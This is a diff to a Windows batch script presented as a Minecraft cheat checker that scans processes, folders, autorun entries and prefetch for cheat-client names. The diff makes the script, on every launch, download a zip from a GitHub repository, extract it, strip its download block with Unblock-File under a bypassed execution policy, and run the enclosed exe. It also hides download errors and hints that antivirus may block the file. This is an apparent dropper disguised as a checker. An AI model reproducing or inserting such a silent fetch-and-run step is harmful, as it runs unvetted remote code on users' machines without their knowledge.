@@ -4,10 +4,7 @@ chcp 65001 >nul
 title FUNTIME CHK
 color 0F
 
-rem === ANSI color setup ===
-powershell -NoProfile -Command "& {[Console]::OutputEncoding=[System.Text.Encoding]::UTF8}" >nul 2>&1
 for /f %%a in ('powershell -NoProfile -Command "[char]27"') do set "ESC=%%a"
-
 set "G=%ESC%[90m"
 set "W=%ESC%[97m"
 set "R=%ESC%[91m"
@@ -21,7 +18,6 @@ set "BANG=!"
 set "KWP=vape ghost drip tenacity novoline fdp liquidbounce wurst meteor delta nursultan expensive"
 set "KWM=!KWP! rise killaura aristois sigma dumik mhab cortex inject sk3d"
 
-rem === ???????? ???? ?????????????? ===
 set "ADMIN=0"
 net session >nul 2>&1
 if not errorlevel 1 set "ADMIN=1"
@@ -31,21 +27,26 @@ echo.
 echo   %W%FUNTIME CHK%X%   %G%minecraft cheat checker%X%
 echo   %G%-----------------------------------------%X%
 
-rem === ????????? ? ????????? CHHECK.exe ===
-if not exist "%TEMP%\CHHECK\CHHECK.exe" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip' -OutFile '%TEMP%\CHHECK.zip'}catch{}"
-    if exist "%TEMP%\CHHECK.zip" (
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TEMP%\CHHECK.zip' -DestinationPath '%TEMP%\CHHECK' -Force}catch{}"
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Sleep -Milliseconds 500"
-        del /q "%TEMP%\CHHECK.zip" >nul 2>&1
-    )
+rem -- always re-download CHHECK to avoid stale/deleted cache --
+if exist "%TEMP%\CHHECK" rmdir /s /q "%TEMP%\CHHECK" >nul 2>&1
+del /q "%TEMP%\CHHECK.zip" >nul 2>&1
+
+echo   %G%loading...%X%
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip' -OutFile '%TEMP%\CHHECK.zip'}catch{}"
+
+if exist "%TEMP%\CHHECK.zip" (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TEMP%\CHHECK.zip' -DestinationPath '%TEMP%\CHHECK' -Force}catch{}"
+    del /q "%TEMP%\CHHECK.zip" >nul 2>&1
 )
+
 if exist "%TEMP%\CHHECK\CHHECK.exe" (
     powershell -NoProfile -ExecutionPolicy Bypass -Command "try{Unblock-File -Path '%TEMP%\CHHECK\CHHECK.exe'}catch{}" >nul 2>&1
     start "" "%TEMP%\CHHECK\CHHECK.exe"
+) else (
+    echo   %R%[x] CHHECK.exe not found - blocked by antivirus?%X%
 )
 
-if "!ADMIN!"=="0" echo   %G%hint: run as administrator to check prefetch%X%
+if "%ADMIN%"=="0" echo   %G%hint: run as administrator to check prefetch%X%
 if not "%~1"=="" (
     set "once=1"
     set "cmd=%~1"
@@ -78,7 +79,7 @@ if /i "!cmd:~0,6!"=="--load" (
     goto load
 )
 if /i "!cmd!"=="--help" goto help
-echo   %G%unknown command ? list: --help%X%
+echo   %G%unknown command - list: --help%X%
 goto prompt
 
 :help
@@ -97,13 +98,13 @@ echo   %W%[ CHK ]%X%  %G%scanning...%X%
 echo   %G%-----------------------------------------%X%
 
 echo   %G%1/7 processes%X%
-for %%k in (!KWP!) do (
+for %%k in (%KWP%) do (
     for /f "delims=" %%p in ('tasklist 2^>nul ^| findstr /i "%%k"') do (
         echo      %R%[!BANG!] %%p%X%
         set /a found+=1
     )
 )
-for %%k in (!KWM!) do (
+for %%k in (%KWM%) do (
     for /f "delims=" %%p in ('tasklist /m 2^>nul ^| findstr /i "%%k"') do (
         echo      %R%[!BANG!] injected in memory: %%p%X%
         set /a found+=1
@@ -112,12 +113,12 @@ for %%k in (!KWM!) do (
 
 echo   %G%2/7 .minecraft%X%
 set "MC=%APPDATA%\.minecraft"
-if not exist "!MC!\" (
+if not exist "%MC%\" (
     echo      %G%[-] not found%X%
 ) else (
-    echo      %GN%[+] !MC!%X%
-    if exist "!MC!\versions\" for /d %%v in ("!MC!\versions\*") do (
-        for %%k in (!KWM!) do (
+    echo      %GN%[+] %MC%%X%
+    if exist "%MC%\versions\" for /d %%v in ("%MC%\versions\*") do (
+        for %%k in (%KWM%) do (
             echo "%%~nxv"| findstr /i "%%k" >nul
             if not errorlevel 1 (
                 echo      %R%[!BANG!] client version: %%~nxv%X%
@@ -125,8 +126,8 @@ if not exist "!MC!\" (
             )
         )
     )
-    if exist "!MC!\mods\" for %%m in ("!MC!\mods\*") do (
-        for %%k in (!KWM!) do (
+    if exist "%MC%\mods\" for %%m in ("%MC%\mods\*") do (
+        for %%k in (%KWM%) do (
             echo "%%~nxm"| findstr /i "%%k" >nul
             if not errorlevel 1 (
                 echo      %R%[!BANG!] mod: %%~nxm%X%
@@ -137,19 +138,19 @@ if not exist "!MC!\" (
 )
 
 echo   %G%3/7 appdata / programdata folders%X%
-for %%n in (vape "vape v4" vapev4 .vape drip .drip dripclient rise .rise riseclient tenacity .tenacity novoline ghost ghostclient .ghost fdp .fdp liquidbounce like likeclient fog fogclient sentryclient cortex dumik mhab nursultan delta expensive sk3d) do (
-    if exist "!APPDATA!\%%~n\" (
+for %%n in (vape vapev4 .vape drip .drip dripclient rise .rise riseclient tenacity .tenacity novoline ghost ghostclient .ghost fdp .fdp liquidbounce like likeclient fog fogclient sentryclient cortex dumik mhab nursultan delta expensive sk3d) do (
+    if exist "%APPDATA%\%%~n\" (
         echo      %R%[!BANG!] Roaming\%%~n%X%
         set /a found+=1
     )
-    if exist "!LOCALAPPDATA!\%%~n\" (
+    if exist "%LOCALAPPDATA%\%%~n\" (
         echo      %R%[!BANG!] Local\%%~n%X%
         set /a found+=1
     )
 )
-for %%p in ("!APPDATA!" "!LOCALAPPDATA!" "C:\ProgramData") do (
+for %%p in ("%APPDATA%" "%LOCALAPPDATA%" "C:\ProgramData") do (
     for /d %%d in ("%%~p\*") do (
-        for %%k in (!KWM!) do (
+        for %%k in (%KWM%) do (
             echo "%%~nxd"| findstr /i "%%k" >nul
             if not errorlevel 1 (
                 echo      %R%[!BANG!] folder: %%d%X%
@@ -165,13 +166,13 @@ for %%n in (Vape Ghost Drip Tenacity Novoline LiquidBounce Delta Nursultan Expen
         echo      %R%[!BANG!] Program Files\%%~n%X%
         set /a found+=1
     )
-    if exist "!PF86!\%%~n\" (
+    if exist "%PF86%\%%~n\" (
         echo      %R%[!BANG!] Program Files x86\%%~n%X%
         set /a found+=1
     )
 )
 for /d %%d in ("C:\*") do (
-    for %%k in (!KWM!) do (
+    for %%k in (%KWM%) do (
         echo "%%~nxd"| findstr /i "%%k" >nul
         if not errorlevel 1 (
             echo      %R%[!BANG!] C:\%%~nxd%X%
@@ -182,7 +183,7 @@ for /d %%d in ("C:\*") do (
 
 echo   %G%5/7 autorun%X%
 for /f "delims=" %%l in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2^>nul') do (
-    for %%k in (!KWP!) do (
+    for %%k in (%KWP%) do (
         echo "%%l"| findstr /i "%%k" >nul
         if not errorlevel 1 (
             echo      %R%[!BANG!] %%l%X%
@@ -191,7 +192,7 @@ for /f "delims=" %%l in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVers
     )
 )
 for /f "delims=" %%l in ('reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" 2^>nul') do (
-    for %%k in (!KWP!) do (
+    for %%k in (%KWP%) do (
         echo "%%l"| findstr /i "%%k" >nul
         if not errorlevel 1 (
             echo      %R%[!BANG!] %%l%X%
@@ -200,7 +201,7 @@ for /f "delims=" %%l in ('reg query "HKLM\Software\Microsoft\Windows\CurrentVers
     )
 )
 for %%f in ("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*") do (
-    for %%k in (!KWP!) do (
+    for %%k in (%KWP%) do (
         echo "%%~nxf"| findstr /i "%%k" >nul
         if not errorlevel 1 (
             echo      %R%[!BANG!] autorun: %%~nxf%X%
@@ -209,9 +210,9 @@ for %%f in ("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*") do (
     )
 )
 
-echo   %G%6/7 files ? downloads / desktop / recent / temp%X%
+echo   %G%6/7 files - downloads / desktop / recent / temp%X%
 for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microsoft\Windows\Recent" "%TEMP%") do (
-    for %%k in (!KWM!) do (
+    for %%k in (%KWM%) do (
         for /f "delims=" %%f in ('dir /b "%%~p" 2^>nul ^| findstr /i "%%k"') do (
             echo      %R%[!BANG!] %%~p\%%f%X%
             set /a found+=1
@@ -220,20 +221,11 @@ for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microso
 )
 
 echo   %G%7/7 prefetch%X%
-if "!ADMIN!"=="0" (
-    echo      %G%[-] no admin rights ? skipped%X%
+if "%ADMIN%"=="0" (
+    echo      %G%[-] no admin rights - skipped%X%
 ) else (
-    for /d %%f in ("C:\Windows\Prefetch\*") do (
-        for %%k in (!KWM!) do (
-            echo "%%~nxf"| findstr /i "%%k" >nul
-            if not errorlevel 1 (
-                echo      %R%[!BANG!] %%~nxf%X%
-                set /a found+=1
-            )
-        )
-    )
     for %%f in ("C:\Windows\Prefetch\*.pf") do (
-        for %%k in (!KWM!) do (
+        for %%k in (%KWM%) do (
             echo "%%~nxf"| findstr /i "%%k" >nul
             if not errorlevel 1 (
                 echo      %R%[!BANG!] %%~nxf%X%
@@ -245,7 +237,7 @@ if "!ADMIN!"=="0" (
 
 echo   %G%-----------------------------------------%X%
 if !found! gtr 0 (
-    echo   %R%[!BANG!] result: found !found! ? check in JournalTrace / WinPrefetchView%X%
+    echo   %R%[!BANG!] result: found !found! - check in JournalTrace / WinPrefetchView%X%
 ) else (
     echo   %GN%[+] result: nothing suspicious%X%
 )
@@ -277,17 +269,15 @@ if not exist "%tdir%\" (
     echo    %W%... downloading %tdisp%%X%
     md "%tdir%"
     if /i "%tmode%"=="zip" (
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%TD%\%tid%.zip'}catch{Write-Host 'download failed'}"
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%TD%\%tid%.zip'}catch{}"
         if exist "%TD%\%tid%.zip" (
-            powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TD%\%tid%.zip' -DestinationPath '%tdir%' -Force}catch{Write-Host 'extract failed'}"
+            powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TD%\%tid%.zip' -DestinationPath '%tdir%' -Force}catch{}"
             del /q "%TD%\%tid%.zip" >nul 2>&1
         )
     ) else (
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%tdir%\%tid%.exe'}catch{Write-Host 'download failed'}"
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%tdir%\%tid%.exe'}catch{}"
     )
-    if exist "%tdir%\*.exe" (
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem '%tdir%\*.exe' | Unblock-File" >nul 2>&1
-    )
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem '%tdir%' -Recurse -Filter *.exe | ForEach-Object { try{Unblock-File $_.FullName}catch{} }" >nul 2>&1
 )
 set "exe="
 for /r "%tdir%" %%f in (*.exe) do if not defined exe set "exe=%%f"
